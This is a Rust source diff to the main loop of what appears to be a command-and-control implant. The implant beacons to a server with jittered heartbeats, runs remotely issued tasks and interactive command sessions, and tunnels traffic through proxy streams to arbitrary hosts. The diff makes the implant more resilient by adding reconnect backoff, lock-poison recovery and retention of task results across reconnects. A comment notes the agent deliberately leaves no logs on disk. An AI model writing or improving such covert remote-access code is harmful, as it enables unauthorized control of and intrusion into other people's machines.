@@ -16,12 +16,21 @@ use protocol::{AgentMessage, Config, ServerCommand};
 use services::{HeartbeatService, NetworkService, ProxyService, SessionService, TaskService};
 use std::{
     sync::{mpsc, Arc, Mutex},
-    time::Duration,
+    time::{Duration, SystemTime, UNIX_EPOCH},
 };
 
 // Agent never writes to disk — no logging, no file I/O outside of explicit
 // user-requested operations (file upload/download, screenshot save).
 macro_rules! alog { ($($arg:tt)*) => {{}} }
+
+/// Minimum reconnect backoff in seconds.
+const MIN_BACKOFF_SECS: u64 = 3;
+/// Maximum reconnect backoff in seconds.
+const MAX_BACKOFF_SECS: u64 = 60;
+/// Backoff multiplier applied per consecutive failure.
+const BACKOFF_MULTIPLIER: f64 = 2.0;
+/// Random jitter percentage added to backoff.
+const JITTER_PERCENT: u64 = 20;
 
 fn main() {
 
@@ -47,7 +56,7 @@ fn main() {
     let heartbeat = Arc::new(Mutex::new(HeartbeatService::new()));
     heartbeat
         .lock()
-        .unwrap()
+        .unwrap_or_else(|e| e.into_inner())
         .update(cfg.heartbeat_secs, cfg.jitter);
     let task = Arc::new(Mutex::new(TaskService::new(
         op_cfg.clone(),
@@ -56,19 +65,60 @@ fn main() {
     let session = Arc::new(Mutex::new(SessionService::new(op_cfg, outbox_tx.clone())));
     let proxy = Arc::new(Mutex::new(ProxyService::new(outbox_tx.clone())));
 
+    let mut reconnect_attempts: u32 = 0;
+
     loop {
-        alog!("run_once starting");
+        // Reset all service state before each reconnect attempt so stale
+        // task/session/proxy state from a dead connection does not leak.
+        task.lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .reset();
+        session.lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .reset();
+        proxy.lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .reset();
+
+        alog!("run_once starting (attempt {})", reconnect_attempts);
         if run_once(
             &kernel, &cfg, &network, &heartbeat, &task, &session, &proxy, &outbox_tx, &outbox_rx,
         )
-        .is_err()
+        .is_ok()
         {
-            alog!("run_once failed, reconnect in {}s", cfg.reconnect_secs);
+            alog!("run_once returned Ok, resetting backoff");
+            reconnect_attempts = 0;
         } else {
-            alog!("run_once returned Ok");
+            alog!("run_once failed");
+            reconnect_attempts = reconnect_attempts.saturating_add(1);
         }
-        kernel.sleep(std::time::Duration::from_secs(cfg.reconnect_secs));
+
+        let backoff = compute_backoff(reconnect_attempts);
+        alog!("reconnect in {}s", backoff);
+        kernel.sleep(Duration::from_secs(backoff));
     }
+}
+
+/// Compute exponential backoff with jitter based on consecutive attempt count.
+fn compute_backoff(attempts: u32) -> u64 {
+    if attempts == 0 {
+        return MIN_BACKOFF_SECS;
+    }
+    let base = (MIN_BACKOFF_SECS as f64) * BACKOFF_MULTIPLIER.powi(attempts as i32);
+    let capped = base.min(MAX_BACKOFF_SECS as f64) as u64;
+
+    // Deterministic-ish jitter from SystemTime nanos (no rand dependency).
+    let seed = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_nanos() as u64)
+        .unwrap_or(0);
+    let max_jitter = capped * JITTER_PERCENT / 100;
+    let jitter = if max_jitter > 0 {
+        seed % (max_jitter + 1)
+    } else {
+        0
+    };
+    capped.saturating_add(jitter)
 }
 
 fn run_once(
@@ -82,34 +132,35 @@ fn run_once(
     outbox_tx: &mpsc::Sender<AgentMessage>,
     outbox_rx: &mpsc::Receiver<AgentMessage>,
 ) -> Result<(), ()> {
-    clear_outbox(outbox_rx);
+    // Do NOT clear the outbox here — pending task results must survive
+    // reconnects.  They will be flushed after successful registration.
 
     // Connect
     {
-        let mut net = network.lock().unwrap();
-        if !net.connect(&cfg.server_addr) {
-            alog!("connect failed to {}", cfg.server_addr);
+        let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
+        if !net.connect(&cfg.server_addr()) {
+            alog!("connect failed to {}", cfg.server_addr());
             return Err(());
         }
-        alog!("connected to {}", cfg.server_addr);
+        alog!("connected to {}", cfg.server_addr());
     }
 
     // Receive hello
     let hello = {
-        let mut net = network.lock().unwrap();
+        let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
         net.receive_hello()
     };
 
     // Build register
     let (sleep_interval, jitter) = {
-        let heartbeat = heartbeat.lock().unwrap();
+        let heartbeat = heartbeat.lock().unwrap_or_else(|e| e.into_inner());
         (heartbeat.interval_secs(), heartbeat.jitter())
     };
     let register = protocol::build_register(cfg, hello.as_ref(), sleep_interval, jitter);
 
     // Send register
     {
-        let mut net = network.lock().unwrap();
+        let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
         if net.send(&register).is_err() {
             alog!("register send failed");
             return Err(());
@@ -117,10 +168,14 @@ fn run_once(
         alog!("register sent");
     }
 
+    // Flush any outbox messages that accumulated while we were disconnected
+    // (e.g. task results that completed between disconnect and reconnect).
+    flush_outbox(network, outbox_rx, None)?;
+
     loop {
-        let heartbeat_wait = heartbeat.lock().unwrap().wait_duration();
-        let wait = if session.lock().unwrap().should_poll_fast()
-            || proxy.lock().unwrap().should_poll_fast()
+        let heartbeat_wait = heartbeat.lock().unwrap_or_else(|e| e.into_inner()).wait_duration();
+        let wait = if session.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast()
+            || proxy.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast()
         {
             heartbeat_wait.min(Duration::from_millis(100))
         } else {
@@ -128,7 +183,7 @@ fn run_once(
         };
 
         let line = {
-            let mut net = network.lock().unwrap();
+            let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
             net.read_line(wait)
         };
 
@@ -141,6 +196,9 @@ fn run_once(
                 };
 
                 match cmd {
+                    ServerCommand::Ack { message } => {
+                        alog!("registration acknowledged: {}", message);
+                    }
                     ServerCommand::Disconnect { .. } => {
                         alog!("got Disconnect, returning Ok");
                         return Ok(());
@@ -151,7 +209,7 @@ fn run_once(
                         payload,
                     } => {
                         task.lock()
-                            .unwrap()
+                            .unwrap_or_else(|e| e.into_inner())
                             .dispatch(&task_id, &command, payload.as_deref());
                     }
                     ServerCommand::ExecuteCommandSession {
@@ -161,24 +219,24 @@ fn run_once(
                     } => {
                         session
                             .lock()
-                            .unwrap()
+                            .unwrap_or_else(|e| e.into_inner())
                             .execute(&command_session_id, &request_id, &line);
                     }
                     ServerCommand::OpenCommandSession { command_session_id } => {
-                        session.lock().unwrap().open(&command_session_id);
+                        session.lock().unwrap_or_else(|e| e.into_inner()).open(&command_session_id);
                     }
                     ServerCommand::CloseCommandSession { command_session_id } => {
-                        session.lock().unwrap().close(&command_session_id);
+                        session.lock().unwrap_or_else(|e| e.into_inner()).close(&command_session_id);
                     }
                     ServerCommand::CancelTask { task_id } => {
-                        task.lock().unwrap().cancel(&task_id);
+                        task.lock().unwrap_or_else(|e| e.into_inner()).cancel(&task_id);
                     }
                     ServerCommand::UpdateBeaconConfig {
                         request_id,
                         sleep_interval,
                         jitter,
                     } => {
-                        heartbeat.lock().unwrap().update(sleep_interval, jitter);
+                        heartbeat.lock().unwrap_or_else(|e| e.into_inner()).update(sleep_interval, jitter);
                         let _ = outbox_tx.send(AgentMessage::ConfigUpdated {
                             request_id,
                             sleep_interval,
@@ -189,7 +247,7 @@ fn run_once(
                         proxy_id,
                         bind_addr,
                     } => {
-                        proxy.lock().unwrap().open(&proxy_id, &bind_addr);
+                        proxy.lock().unwrap_or_else(|e| e.into_inner()).open(&proxy_id, &bind_addr);
                     }
                     ServerCommand::ProxyConnect {
                         proxy_id,
@@ -199,7 +257,7 @@ fn run_once(
                     } => {
                         proxy
                             .lock()
-                            .unwrap()
+                            .unwrap_or_else(|e| e.into_inner())
                             .connect(&proxy_id, &stream_id, &host, port);
                     }
                     ServerCommand::ProxyData {
@@ -209,17 +267,17 @@ fn run_once(
                     } => {
                         proxy
                             .lock()
-                            .unwrap()
+                            .unwrap_or_else(|e| e.into_inner())
                             .data(&proxy_id, &stream_id, &data_base64);
                     }
                     ServerCommand::ProxyClose {
                         proxy_id,
                         stream_id,
                     } => {
-                        proxy.lock().unwrap().close_stream(&proxy_id, &stream_id);
+                        proxy.lock().unwrap_or_else(|e| e.into_inner()).close_stream(&proxy_id, &stream_id);
                     }
                     ServerCommand::CloseProxy { proxy_id } => {
-                        proxy.lock().unwrap().close_proxy(&proxy_id);
+                        proxy.lock().unwrap_or_else(|e| e.into_inner()).close_proxy(&proxy_id);
                     }
                     _ => {
                         alog!("unhandled ServerCommand: {}", line);
@@ -233,17 +291,17 @@ fn run_once(
                 return Ok(());
             }
             Err(_) => {
-                let poll_fast = session.lock().unwrap().should_poll_fast()
-                    || proxy.lock().unwrap().should_poll_fast();
-                let hb_due = heartbeat.lock().unwrap().should_send();
+                let poll_fast = session.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast()
+                    || proxy.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast();
+                let hb_due = heartbeat.lock().unwrap_or_else(|e| e.into_inner()).should_send();
                 alog!("read timeout: poll_fast={} hb_due={}", poll_fast, hb_due);
                 if poll_fast {
                     flush_outbox(network, outbox_rx, None)?;
                     alog!("after cmd/proxy flush_outbox OK, looping");
-                    session.lock().unwrap().clear_flush_hint();
-                    proxy.lock().unwrap().clear_flush_hint();
+                    session.lock().unwrap_or_else(|e| e.into_inner()).clear_flush_hint();
+                    proxy.lock().unwrap_or_else(|e| e.into_inner()).clear_flush_hint();
                 }
-                if heartbeat.lock().unwrap().should_send() {
+                if heartbeat.lock().unwrap_or_else(|e| e.into_inner()).should_send() {
                     alog!("sending heartbeat");
                     flush_outbox(
                         network,
@@ -252,15 +310,11 @@ fn run_once(
                             agent_id: Some(cfg.metadata.agent_id.clone()),
                         }),
                     )?;
-                    heartbeat.lock().unwrap().sent();
+                    heartbeat.lock().unwrap_or_else(|e| e.into_inner()).sent();
                 }
             }
         }
     }
-}
-
-fn clear_outbox(outbox_rx: &mpsc::Receiver<AgentMessage>) {
-    while outbox_rx.try_recv().is_ok() {}
 }
 
 fn flush_outbox(
@@ -279,7 +333,7 @@ fn flush_outbox(
         return Ok(());
     }
 
-    let mut net = network.lock().unwrap();
+    let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
     for message in messages {
         net.send(&message)?;
     }
